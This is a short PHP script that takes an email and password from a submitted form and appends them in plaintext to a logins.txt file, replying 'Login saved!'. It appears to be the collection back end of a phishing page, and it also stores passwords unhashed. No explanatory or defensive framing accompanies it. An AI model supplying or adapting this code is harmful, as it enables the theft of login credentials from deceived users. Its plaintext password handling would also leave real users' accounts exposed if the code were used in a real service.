<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    $entry = "Username: $email | Password: $password\n";

    // Append to a file
    file_put_contents("logins.txt", $entry, FILE_APPEND | LOCK_EX);
    echo "Login saved!";
}
?>
